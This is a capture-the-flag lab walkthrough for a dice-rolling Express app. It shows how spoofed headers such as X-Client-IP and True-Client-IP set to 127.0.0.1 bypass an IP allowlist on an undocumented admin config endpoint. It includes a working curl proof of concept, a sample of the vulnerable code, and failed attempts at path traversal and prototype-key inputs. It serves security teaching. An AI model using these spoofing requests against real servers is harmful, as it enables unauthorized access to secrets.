# dice-003 - BugForge Lab Walkthrough

**URL:** https://lab-1785229202595-ru2yz6.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Broken Access Control - IP allowlist bypass via spoofable client-supplied headers
**Flag:** `bug{7ZGVmJm6oy8ug4gq0MHTc1TdA9Bm570v}`

---

## Summary

DiceForge is a small dice-rolling SPA - drag dice into a tray, roll them, view local history.
The documented feature set only exposes one API route on the frontend. An undocumented admin
config endpoint exists behind what should be an internal-only IP allowlist, but the allowlist
check trusts client-supplied IP headers instead of the actual connection IP, letting any external
client bypass it and read a config blob containing the flag.

---

## Tech Stack

- React SPA frontend (Create React App, MUI)
- Express.js (Node.js)
- No authentication, no accounts, no database-backed state - the only documented feature is
  stateless dice rolling

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/roll` | POST | No | Rolls dice server-side from a `{type, count}` array; the only route referenced in the frontend bundle |
| `/api/admin` | GET | No | Not referenced anywhere in the frontend - returns `{"error":"Incomplete path"}` (400), not the SPA fallback |
| `/api/admin/config` | GET | IP-allowlist (spoofable) | **Vulnerable** - returns app config including the flag once the allowlist check is bypassed |

---

## Discovery

### Step 1 - Map the real route surface

The frontend bundle (`/static/js/main.*.js`) only references a single API call:
`axios.post('/api/roll', { dice: dicePayload })`. Everything else in the app is client-side
state (a dice tray and a `localStorage`-backed roll history) - no login, no accounts, no other
visible endpoints.

Pulling the bundle's source map gave the full unminified React components
(`DiceRoller.js`, `RollHistory.js`, `App.js`, `index.js`), confirming there is genuinely no other
client-referenced route.

### Step 2 - Rule out the classic bugs for this app family

This app family has shown different backend bugs across instances, so each was tested directly
rather than assumed:

- Command injection via a shell-simulator field on `/api/roll` (a bug seen in an earlier
  instance of this app) - not present; the request schema here only accepts a `dice` array of
  `{type, count}` objects, no free-form shell field exists.
- A crawler-User-Agent paywall bypass on a subscription feature (a bug seen in another earlier
  instance) - not present; no paywall, subscription, or "quantum roll" feature exists in this
  instance's bundle or route surface at all.
- Dice `type` validation was found to accept a handful of JavaScript-inherited property names
  (`__proto__`, `constructor`, `toString`, `valueOf`, `hasOwnProperty`) as if they were valid dice
  types, returning `rolls:[null]` - a real quirk (the whitelist lookup is on a plain object and
  doesn't guard against prototype-inherited keys) but a dead end: no write primitive, no
  persistence across requests, and it doesn't bypass the 1-20 count cap.
- The `count` field is parsed with a truncating integer parse (`"20x"` is accepted as `20`), but
  the resulting integer is always correctly bound-checked between 1 and 20 regardless of type -
  no overflow or NaN bypass found.

### Step 3 - Systematically probe for hidden write endpoints and testing write-endpoint ownership checks

Since the SPA serves `index.html` for any unrecognized path (client-side routing catch-all), every
guessed path normally returns `200` with the same HTML shell - a useless signal on its own. The
key was noticing that one guessed path broke that pattern:

```
GET /api/admin
-> 400 {"error":"Incomplete path"}
```

That's a real JSON error from the server, not the SPA fallback - meaning `/api/admin` is an actual
mounted route with child paths, just undocumented in the frontend. Enumerating common subpaths
under it turned up one more genuine route (again distinguished by breaking the 200-HTML fallback
pattern):

```
GET /api/admin/config
-> 403 {"error":"Forbidden"}
```

This is the shape of a route guarded by a missing-ownership/missing-authorization check rather
than authentication - a 403 (not 401) with no login mechanism anywhere in the app implies the gate
is checking something about the request itself (like source IP) rather than a session.

### Step 4 - Bypass the check

Standard loopback-spoofing headers were tried first and had no effect:

```
X-Forwarded-For: 127.0.0.1   -> still 403
X-Real-IP: 127.0.0.1         -> still 403
```

Trying a different, less common set of IP-forwarding headers together in a single request worked:

```
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

-> 200 {"appName":"DiceForge","version":"1.0.0",
        "apiSecret":"bug{7ZGVmJm6oy8ug4gq0MHTc1TdA9Bm570v}",
        "maxDicePerRoll":20,"maxDiceTypes":7,"rateLimit":100}
```

The allowlist check reads a client-controllable header as the "real" source IP, so any external
caller can present themselves as `127.0.0.1` and pass it.

---

## Proof of Concept

```bash
BASE="https://lab-1785229202595-ru2yz6.labs-app.bugforge.io"

curl -s "$BASE/api/admin/config" \
  -H "X-Client-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "True-Client-IP: 127.0.0.1"

# {"appName":"DiceForge","version":"1.0.0",
#  "apiSecret":"bug{7ZGVmJm6oy8ug4gq0MHTc1TdA9Bm570v}",
#  "maxDicePerRoll":20,"maxDiceTypes":7,"rateLimit":100}
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Command injection on `/api/roll` (a bug from an earlier instance of this app) | Request schema has no free-form shell field | Not present in this instance |
| Crawler User-Agent paywall bypass (a bug from an earlier instance of this app) | No paywall/subscription feature exists at all | Not present in this instance |
| Dice `type` = `__proto__`/`constructor`/`toString`/`valueOf`/`hasOwnProperty` | Bypasses the type whitelist (inherited property names), returns `rolls:[null]` | Real quirk, but no write primitive or persistence - cosmetic only |
| `count` as `"20x"`, `"999999x"`, negative, huge, decimal | Truncated to a leading integer, then correctly bound-checked 1-20 every time | No bypass of the per-roll cap |
| Static path traversal (`/flag.txt`, `/../flag.txt`, `/data/flag.txt`, `/app/flag.txt`, `%2e%2e` encodings) | All hit the SPA catch-all or were blocked at the framework level | Not the intended path |
| `X-Forwarded-For: 127.0.0.1` / `X-Real-IP: 127.0.0.1` on `/api/admin/config` | Still 403 | This instance specifically trusts a different header set |
| `/api/register`, `/api/login` | 404, `Cannot POST` | No accounts/auth system exists in this app at all |

---

## Root Cause

The admin config route authorizes based on a client-supplied "IP" header rather than the actual
TCP connection address (or a header set exclusively by a trusted reverse proxy, with any
client-supplied value of the same name stripped before it reaches the app):

```javascript
// Vulnerable pattern (approximate)
function getClientIp(req) {
  return req.headers['x-client-ip']
      || req.headers['x-originating-ip']
      || req.headers['true-client-ip']
      || req.socket.remoteAddress;
}

app.get('/api/admin/config', (req, res) => {
  const ip = getClientIp(req);
  if (ip !== '127.0.0.1' && !ip.startsWith('10.') /* ... */) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  res.json(CONFIG); // includes apiSecret
});
```

Because the function checks a handful of headers an ordinary client can set on any outbound
request, before ever falling back to the real socket address, any caller can claim to be
`127.0.0.1` and satisfy the check.

---

## CWE / OWASP

- **CWE-290**: Authentication Bypass by Spoofing
- **CWE-346**: Origin Validation Error
- **OWASP API Security Top 10 (2023)** - API5:2023 Broken Function Level Authorization
